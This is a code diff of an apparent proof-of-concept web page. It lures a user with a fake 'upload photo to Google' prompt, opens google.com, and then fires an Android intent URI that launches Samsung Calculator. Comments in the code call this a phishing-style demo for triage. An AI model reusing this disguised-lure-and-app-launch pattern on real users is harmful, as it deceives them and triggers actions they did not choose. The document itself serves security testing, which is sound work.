@@ -1,16 +1,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-    h1 { margin: 1em; }
-    a { position: absolute; top: 0; left: 0; right: 0; bottom: 0; }
-    input { display: none; }
-    img { width: 100%; }
-</style>
 
-<h1>Tap to upload photo</h1>
-
-<input id="fileSelect" type="file" accept="image/*" />
+<h1>Tap to upload photo to Google</h1>
+<input id="fileSelect" type="file" accept="image/*" style="display:none;" />
 <img id="preview" style="max-width: 100%; margin-top: 20px;" />
-<a id="link" target="_blank"></a>
+<a id="link" href="#">Click</a>
 
 <script>
 link.onclick = () => {
@@ -18,51 +11,21 @@ link.onclick = () => {
         fileHandle.getFile().then((file) => {
             const reader = new FileReader();
             reader.onload = function(e) {
-                document.getElementById('preview').src = e.target.result;
+                preview.src = e.target.result;
             };
             reader.readAsDataURL(file);
+
+            // First action: open google.com in new tab
+            window.open("https://www.google.com", "_blank");
+
+            // Small delay then second action: launch Samsung Calculator
+            setTimeout(() => {
+                location.href = "intent://com.sec.android.app.popupcalculator#Intent;scheme=android-app;end";
+            }, 500);
         });
-
-        // Open Google
-        window.open("https://www.google.com", "_blank");
-
-        // Launch Samsung Calculator via intent
-        window.location.href = "intent://com.sec.android.app.popupcalculator#Intent;scheme=android-app;end";
     });
-}
-
-fileSelect.onchange = (event) => {
-    img.src = URL.createObjectURL(fileSelect.files[0]);
-}
+};
 </script>
-      input.click();
-      // wait for a file selection (or user cancel) — listen for change or timeout
-      await new Promise((resolve) => {
-        let resolved = false;
-        input.addEventListener('change', () => { if (!resolved) { resolved = true; resolve(); }}, {once:true});
-        setTimeout(() => { if (!resolved) { resolved = true; resolve(); } }, 10000);
-      });
-      input.remove();
-    }
-
-    // Step A: open google in a new tab — opens a visible page for phishing/demo
-    const googleWin = window.open('https://www.google.com', '_blank');
-
-    // Step B: shortly after, attempt to launch Samsung Calculator via intent
-    // Use a small delay so the new tab is created first (helps demonstration)
-    setTimeout(() => {
-      try {
-        // Use window.open with _blank so Chrome attempts an intent handler
-        window.open(samsungCalcIntent, '_blank');
-      } catch (e) {
-        // final fallback: navigate current page (will replace current tab)
-        window.location.href = samsungCalcIntent;
-      }
-    }, 250); // 250ms delay; tweak if needed
-
-  } catch (err) {
-    // Show error info for triage/testing
-    alert('Error during PoC: ' + (err && err.message ? err.message : String(err)));
     console.warn(err);
   }
 }
